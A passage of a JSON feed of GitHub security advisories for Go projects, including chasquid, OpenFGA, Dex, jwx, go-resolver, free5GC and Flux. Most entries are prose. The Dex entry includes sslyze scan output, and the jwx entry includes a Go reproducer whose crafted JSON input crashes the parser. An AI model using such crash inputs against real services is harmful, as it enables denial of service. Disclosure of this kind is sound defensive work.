                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xvq9-4vpv-227m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>chasquid before 1.13 allows SMTP smuggling because LF-terminated lines are accepted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52354\">https://nvd.nist.gov/vuln/detail/CVE-2023-52354</a></li>\n<li><a href=\"https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24\">https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24</a></li>\n<li><a href=\"https://github.com/albertito/chasquid/issues/47\">https://github.com/albertito/chasquid/issues/47</a></li>\n<li><a href=\"https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74\">https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4x3-mfpj-f335\">https://github.com/advisories/GHSA-g4x3-mfpj-f335</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g4x3-mfpj-f335",
            "title": "[github.com/albertito/chasquid] chasquid HTTP Request/Response Smuggling vulnerability",
            "date_modified": "2024-01-29T22:29:09.000Z",
            "date_published": "2024-01-22T06:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g4x3-mfpj-f335"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"overview\">Overview</h2>\n<p>OpenFGA is vulnerable to a DoS attack. In some scenarios that depend on the model and tuples used, a call to ListObjects may not  release memory properly. So when a sufficiently high number of those calls are executed, the OpenFGA server can create an \"out of memory\" error and terminate.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>Upgrade to v1.4.3. This upgrade is backwards compatible.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openfga/openfga/security/advisories/GHSA-rxpw-85vw-fx87\">https://github.com/openfga/openfga/security/advisories/GHSA-rxpw-85vw-fx87</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23820\">https://nvd.nist.gov/vuln/detail/CVE-2024-23820</a></li>\n<li><a href=\"https://github.com/openfga/openfga/commit/908ac85c8b7769c8042cca31886df8db01976c39\">https://github.com/openfga/openfga/commit/908ac85c8b7769c8042cca31886df8db01976c39</a></li>\n<li><a href=\"https://github.com/openfga/openfga/releases/tag/v1.4.3\">https://github.com/openfga/openfga/releases/tag/v1.4.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rxpw-85vw-fx87\">https://github.com/advisories/GHSA-rxpw-85vw-fx87</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rxpw-85vw-fx87",
            "title": "[github.com/openfga/openfga] OpenFGA denial of service",
            "date_modified": "2024-01-26T20:12:00.000Z",
            "date_published": "2024-01-26T20:12:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rxpw-85vw-fx87"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Dex 2.37.0 is serving HTTPS with insecure TLS 1.0 and TLS 1.1.</p>\n<h3 id=\"details\">Details</h3>\n<p>While working on <a href=\"https://github.com/dexidp/dex/issues/2848\">https://github.com/dexidp/dex/issues/2848</a> and implementing configurable TLS support, I noticed my changes did not have any effect in TLS config, so I started investigating. </p>\n<p><a href=\"https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425\">https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425</a> is seemingly setting TLS 1.2 as minimum version, but the whole tlsConfig is ignored after \"TLS cert reloader\" was introduced in <a href=\"https://github.com/dexidp/dex/pull/2964\">https://github.com/dexidp/dex/pull/2964</a>. Configured cipher suites are not respected either, as seen on the output.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Build Dex, generate certs with <code>gencert.sh</code>, modify <code>config.dev.yaml</code> to run on https, using generated certs.</p>\n<pre><code class=\"language-console\">issuer: http://127.0.0.1:5556/dex\n\nstorage:\n  type: sqlite3\n  config:\n    file: dex.db\n\nweb:\n  https: 127.0.0.1:5556\n  tlsCert: examples/k8s/ssl/cert.pem\n  tlsKey: examples/k8s/ssl/key.pem\n\n&lt;rest as default&gt;\n</code></pre>\n<p>Run dex <code>bin/dex serve config.dev.yaml</code>.</p>\n<p>Install <code>sslyze</code>, easy to use SSL connection analyzer:</p>\n<pre><code class=\"language-console\">pip3 install sslyze\nsslyze 127.0.0.1:5556\n</code></pre>\n<p>In Dex 2.37.0, TLS 1.0 and TLS 1.1 are enabled in addition to expected TLS 1.2 and TLS 1.3.</p>\n<pre><code class=\"language-console\"> * TLS 1.0 Cipher Suites:\n     Attempted to connect using 80 cipher suites.\n\n     The server accepted the following 6 cipher suites:\n        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      \n        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      \n        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      \n        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)\n\n     The group of cipher suites supported by the server has the following properties:\n       Forward Secrecy                    OK - Supported\n       Legacy RC4 Algorithm               OK - Not Supported\n\n\n * TLS 1.1 Cipher Suites:\n     Attempted to connect using 80 cipher suites.\n\n     The server accepted the following 6 cipher suites:\n        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      \n        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      \n        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      \n        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)\n\n     The group of cipher suites supported by the server has the following properties:\n       Forward Secrecy                    OK - Supported\n       Legacy RC4 Algorithm               OK - Not Supported\n\n\n * TLS 1.2 Cipher Suites:\n     Attempted to connect using 156 cipher suites.\n\n     The server accepted the following 11 cipher suites:\n        TLS_RSA_WITH_AES_256_GCM_SHA384                   256                      \n        TLS_RSA_WITH_AES_256_CBC_SHA                      256                      \n        TLS_RSA_WITH_AES_128_GCM_SHA256                   128                      \n        TLS_RSA_WITH_AES_128_CBC_SHA                      128                      \n        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168                      \n        TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       256       ECDH: X25519 (253 bits)\n        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: prime256v1 (256 bits)\n\n     The group of cipher suites supported by the server has the following properties:\n       Forward Secrecy                    OK - Supported\n       Legacy RC4 Algorithm               OK - Not Supported\n\n\n * TLS 1.3 Cipher Suites:\n     Attempted to connect using 5 cipher suites.\n\n     The server accepted the following 3 cipher suites:\n        TLS_CHACHA20_POLY1305_SHA256                      256       ECDH: X25519 (253 bits)\n        TLS_AES_256_GCM_SHA384                            256       ECDH: X25519 (253 bits)\n        TLS_AES_128_GCM_SHA256                            128       ECDH: X25519 (253 bits)\n</code></pre>\n<p>In Dex 2.36.0, TLS 1.0 and TLS 1.1 are disabled as expected.</p>\n<pre><code class=\"language-console\"> * TLS 1.0 Cipher Suites:\n     Attempted to connect using 80 cipher suites; the server rejected all cipher suites.\n\n * TLS 1.1 Cipher Suites:\n     Attempted to connect using 80 cipher suites; the server rejected all cipher suites.\n\n * TLS 1.2 Cipher Suites:\n     Attempted to connect using 156 cipher suites.\n\n     The server accepted the following 5 cipher suites:\n        TLS_RSA_WITH_AES_256_GCM_SHA384                   256                      \n        TLS_RSA_WITH_AES_128_GCM_SHA256                   128                      \n        TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256       256       ECDH: X25519 (253 bits)\n        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: prime256v1 (256 bits)\n        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: prime256v1 (256 bits)\n\n     The group of cipher suites supported by the server has the following properties:\n       Forward Secrecy                    OK - Supported\n       Legacy RC4 Algorithm               OK - Not Supported\n\n\n * TLS 1.3 Cipher Suites:\n     Attempted to connect using 5 cipher suites.\n\n     The server accepted the following 3 cipher suites:\n        TLS_CHACHA20_POLY1305_SHA256                      256       ECDH: X25519 (253 bits)\n        TLS_AES_256_GCM_SHA384                            256       ECDH: X25519 (253 bits)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>TLS 1.0 and TLS 1.1 connections can be decrypted by the attacker, and hence decrypt the traffic to Dex.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dexidp/dex/security/advisories/GHSA-gr79-9v6v-gc9r\">https://github.com/dexidp/dex/security/advisories/GHSA-gr79-9v6v-gc9r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23656\">https://nvd.nist.gov/vuln/detail/CVE-2024-23656</a></li>\n<li><a href=\"https://github.com/dexidp/dex/issues/2848\">https://github.com/dexidp/dex/issues/2848</a></li>\n<li><a href=\"https://github.com/dexidp/dex/pull/2964\">https://github.com/dexidp/dex/pull/2964</a></li>\n<li><a href=\"https://github.com/dexidp/dex/commit/5bbdb4420254ba73b9c4df4775fe7bdacf233b17\">https://github.com/dexidp/dex/commit/5bbdb4420254ba73b9c4df4775fe7bdacf233b17</a></li>\n<li><a href=\"https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425\">https://github.com/dexidp/dex/blob/70d7a2c7c1bb2646b1a540e49616cbc39622fb83/cmd/dex/serve.go#L425</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gr79-9v6v-gc9r\">https://github.com/advisories/GHSA-gr79-9v6v-gc9r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gr79-9v6v-gc9r",
            "title": "[github.com/dexidp/dex] Dex discarding TLSconfig and always serves deprecated TLS 1.0/1.1 and insecure ciphers",
            "date_modified": "2024-01-26T01:57:32.000Z",
            "date_published": "2024-01-26T01:57:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gr79-9v6v-gc9r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Calling <code>jws.Parse</code> with a JSON serialized payload where the <code>signature</code> field is present while <code>protected</code> is absent can lead to a nil pointer dereference.</p>\n<h3 id=\"details\">Details</h3>\n<p>This seems to also affect other functions that calls <code>Parse</code> internally, like <code>jws.Verify</code>.</p>\n<p>My understanding of these functions from the docs is that they are supposed to fail gracefully on invalid input and don't require any prior validation.</p>\n<p>Based on the stack trace in the PoC, the issue seems to be that the processing done in <code>jws/message.go:UnmarshalJSON()</code> assumes that if a <code>signature</code> field is present, then a <code>protected</code> field is also present. If this is not the case, then the subsequent call to <code>getB64Value(sig.protected)</code> will dereference <code>sig.protected</code>, which is <code>nil</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Reproducer:</p>\n<pre><code class=\"language-go\">package poc\n\nimport (\n        \"testing\"\n\n        \"github.com/lestrrat-go/jwx/v2/jws\"\n)\n\nfunc TestPOC(t *testing.T) {\n        _, _ = jws.Parse([]byte(`{\"signature\": \"\"}`))\n}\n</code></pre>\n<p>Result:</p>\n<pre><code>$ go test        \n--- FAIL: TestPOC (0.00s)\npanic: runtime error: invalid memory address or nil pointer dereference [recovered]\n        panic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0x5fd618]\n\ngoroutine 6 [running]:\ntesting.tRunner.func1.2({0x628800, 0x831030})\n        /usr/local/go/src/testing/testing.go:1545 +0x238\ntesting.tRunner.func1()\n        /usr/local/go/src/testing/testing.go:1548 +0x397\npanic({0x628800?, 0x831030?})\n        /usr/local/go/src/runtime/panic.go:914 +0x21f\ngithub.com/lestrrat-go/jwx/v2/jws.getB64Value({0x0?, 0x0?})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:484 +0x18\ngithub.com/lestrrat-go/jwx/v2/jws.(*Message).UnmarshalJSON(0xc0000a2140, {0xc0000ec000, 0x11, 0x200})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/message.go:323 +0x4ad\nencoding/json.(*decodeState).object(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0x16?})\n        /usr/local/go/src/encoding/json/decode.go:604 +0x6cc\nencoding/json.(*decodeState).value(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0xc00006e630?})\n        /usr/local/go/src/encoding/json/decode.go:374 +0x3e\nencoding/json.(*decodeState).unmarshal(0xc0000ea028, {0x64fa60?, 0xc0000a2140?})\n        /usr/local/go/src/encoding/json/decode.go:181 +0x133\nencoding/json.(*Decoder).Decode(0xc0000ea000, {0x64fa60, 0xc0000a2140})\n        /usr/local/go/src/encoding/json/stream.go:73 +0x179\ngithub.com/lestrrat-go/jwx/v2/internal/json.Unmarshal({0xc00001a288, 0x11, 0x11}, {0x64fa60, 0xc0000a2140})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/internal/json/json.go:26 +0x97\ngithub.com/lestrrat-go/jwx/v2/jws.parseJSON({0xc00001a288, 0x11, 0x11})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:588 +0x50\ngithub.com/lestrrat-go/jwx/v2/jws.Parse({0xc00001a288, 0x11, 0x11}, {0x0?, 0xc00006e760?, 0x48450f?})\n        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:525 +0x89\npoc.TestPOC(0x0?)\n        /home/fredrik/src/jwx_poc/poc_test.go:10 +0x57\ntesting.tRunner(0xc0000e4340, 0x68ef30)\n        /usr/local/go/src/testing/testing.go:1595 +0xff\ncreated by testing.(*T).Run in goroutine 1\n        /usr/local/go/src/testing/testing.go:1648 +0x3ad\nexit status 2\nFAIL    poc     0.005s\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability can be used to crash / DOS a system doing JWS verification.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3\">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3</a></li>\n<li><a href=\"https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f\">https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f</a></li>\n<li><a href=\"https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd\">https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21664\">https://nvd.nist.gov/vuln/detail/CVE-2024-21664</a></li>\n<li><a href=\"https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65\">https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pvcr-v8j8-j5q3\">https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pvcr-v8j8-j5q3",
            "title": "[github.com/lestrrat-go/jwx] Parsing JSON serialized payload without protected field can lead to segfault",
            "date_modified": "2024-01-24T16:16:57.000Z",
            "date_published": "2024-01-09T16:18:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pvcr-v8j8-j5q3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. The owner name of RRSIG RRs is not validated, permitting an attacker to present the RRSIG for an attacker-controlled domain in a response for any other domain.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3346\">https://nvd.nist.gov/vuln/detail/CVE-2022-3346</a></li>\n<li><a href=\"https://github.com/peterzen/goresolver/issues/5\">https://github.com/peterzen/goresolver/issues/5</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-0979\">https://pkg.go.dev/vuln/GO-2022-0979</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87mm-qxm5-cp3f\">https://github.com/advisories/GHSA-87mm-qxm5-cp3f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87mm-qxm5-cp3f",
            "title": "[github.com/peterzen/goresolver] go-resolver vulnerable to attacker-controlled domains due to unvalidated RRSIG RRs",
            "date_modified": "2024-01-23T20:39:13.000Z",
            "date_published": "2022-12-28T03:30:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87mm-qxm5-cp3f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. Root DNSSEC public keys are not validated, permitting an attacker to present a self-signed root key and delegation chain.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3347\">https://nvd.nist.gov/vuln/detail/CVE-2022-3347</a></li>\n<li><a href=\"https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257\">https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-1026\">https://pkg.go.dev/vuln/GO-2022-1026</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr65-gpj5-cw74\">https://github.com/advisories/GHSA-jr65-gpj5-cw74</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr65-gpj5-cw74",
            "title": "[github.com/peterzen/goresolver] go-resolver's DNSSEC validation not performed correctly",
            "date_modified": "2024-01-23T20:39:00.000Z",
            "date_published": "2022-12-28T03:30:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr65-gpj5-cw74"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In free5GC 3.2.1, a malformed NGAP message can crash the AMF and NGAP decoders via an index-out-of-range panic in <code>aper.GetBitString</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-43677\">https://nvd.nist.gov/vuln/detail/CVE-2022-43677</a></li>\n<li><a href=\"https://github.com/free5gc/free5gc/issues/402\">https://github.com/free5gc/free5gc/issues/402</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-1083\">https://pkg.go.dev/vuln/GO-2022-1083</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-59hj-62f5-fgmc\">https://github.com/advisories/GHSA-59hj-62f5-fgmc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-59hj-62f5-fgmc",
            "title": "[github.com/free5gc/free5gc] free5GC vulnerable to malformed NGAP message crashing the AMF and NGAP decoders",
            "date_modified": "2024-01-23T20:38:22.000Z",
            "date_published": "2022-10-24T19:00:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-59hj-62f5-fgmc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>\n<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href=\"https://github.com/kubernetes/apimachinery/issues/131\">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href=\"https://fluxcd.io/security/#report-a-vulnerability\">recommended</a>).</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in any of the affected repositories.</li>\n<li>Contact us at the CNCF Flux channel.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kubernetes/apimachinery/issues/131\">https://github.com/kubernetes/apimachinery/issues/131</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v\">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>\n<li><a href=\"https://github.com/kubernetes/apimachinery/issues/131\">https://github.com/kubernetes/apimachinery/issues/131</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-39272\">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>\n<li><a href=\"https://github.com/fluxcd/helm-controller/pull/533\">https://github.com/fluxcd/helm-controller/pull/533</a></li>\n<li><a href=\"https://github.com/fluxcd/image-automation-controller/pull/439\">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>\n<li><a href=\"https://github.com/fluxcd/image-reflector-controller/pull/314\">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>\n<li><a href=\"https://github.com/fluxcd/kustomize-controller/pull/731\">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>\n<li><a href=\"https://github.com/fluxcd/notification-controller/pull/420\">https://github.com/fluxcd/notification-controller/pull/420</a></li>\n<li><a href=\"https://github.com/fluxcd/source-controller/pull/903\">https://github.com/fluxcd/source-controller/pull/903</a></li>\n<li><a href=\"https://github.com/kubernetes/apimachinery#131\">https://github.com/kubernetes/apimachinery#131</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-1071\">https://pkg.go.dev/vuln/GO-2022-1071</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4p5-x4vc-mh4v\">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4p5-x4vc-mh4v",
            "title": "[github.com/fluxcd/source-controller/api] Improper use of metav1.Duration allows for Denial of Service",
            "date_modified": "2024-01-23T20:38:07.000Z",
            "date_published": "2022-10-19T18:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>\n<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href=\"https://github.com/kubernetes/apimachinery/issues/131\">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href=\"https://fluxcd.io/security/#report-a-vulnerability\">recommended</a>).</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in any of the affected repositories.</li>\n<li>Contact us at the CNCF Flux channel.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kubernetes/apimachinery/issues/131\">https://github.com/kubernetes/apimachinery/issues/131</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v\">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>\n<li><a href=\"https://github.com/kubernetes/apimachinery/issues/131\">https://github.com/kubernetes/apimachinery/issues/131</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-39272\">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>\n<li><a href=\"https://github.com/fluxcd/helm-controller/pull/533\">https://github.com/fluxcd/helm-controller/pull/533</a></li>\n<li><a href=\"https://github.com/fluxcd/image-automation-controller/pull/439\">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>\n<li><a href=\"https://github.com/fluxcd/image-reflector-controller/pull/314\">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>\n<li><a href=\"https://github.com/fluxcd/kustomize-controller/pull/731\">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>\n<li><a href=\"https://github.com/fluxcd/notification-controller/pull/420\">https://github.com/fluxcd/notification-controller/pull/420</a></li>\n<li><a href=\"https://github.com/fluxcd/source-controller/pull/903\">https://github.com/fluxcd/source-controller/pull/903</a></li>\n<li><a href=\"https://github.com/kubernetes/apimachinery#131\">https://github.com/kubernetes/apimachinery#131</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2022-1071\">https://pkg.go.dev/vuln/GO-2022-1071</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f4p5-x4vc-mh4v\">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f4p5-x4vc-mh4v",
            "title": "[github.com/fluxcd/notification-controller/api] Improper use of metav1.Duration allows for Denial of Service",
            "date_modified": "2024-01-23T20:38:07.000Z",
            "date_published": "2022-10-19T18:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}